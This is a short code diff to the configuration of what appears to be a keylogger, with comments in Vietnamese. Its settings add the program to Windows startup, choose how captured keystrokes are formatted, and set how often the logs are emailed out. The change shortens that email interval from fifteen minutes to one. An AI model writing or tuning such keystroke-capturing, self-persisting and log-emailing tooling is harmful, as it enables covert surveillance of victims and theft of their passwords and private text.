@@ -36,8 +36,8 @@ AUTO_STARTUP = True    # True: Tự động thêm vào Windows startup
 FORMAT = 0             # 0: Format phím mặc định (readable)
                        # 10: Format decimal codes
                        # 16: Format hexadecimal codes
-                       
-EMAIL_INTERVAL = 15 * 60  # Gửi email mỗi 15 phút (15 * 60 = 900 seconds)
+
+EMAIL_INTERVAL = 1 * 60  # Gửi email mỗi 1 phút (1 * 60 = 60 seconds)
 
 # ============================
 # GLOBAL EMAIL CONFIG VARIABLES
